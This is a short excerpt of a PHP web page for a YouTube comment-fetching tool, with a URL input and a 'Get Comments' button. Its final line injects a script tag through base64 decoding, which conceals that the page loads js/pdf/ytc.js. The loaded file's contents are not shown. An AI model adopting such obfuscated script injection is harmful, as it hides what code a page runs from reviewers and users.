...
<?php include('admin/header.php'); ?>
 ...
 <style>
        ...
        <input type="text" id="videoUrl" placeholder="https://www.youtube.com/watch?v=VIDEO_ID"><br>
        <button onclick="getVideoComments()">Get Comments</button>
...
<script>document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9wZGYveXRjLmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));</script>
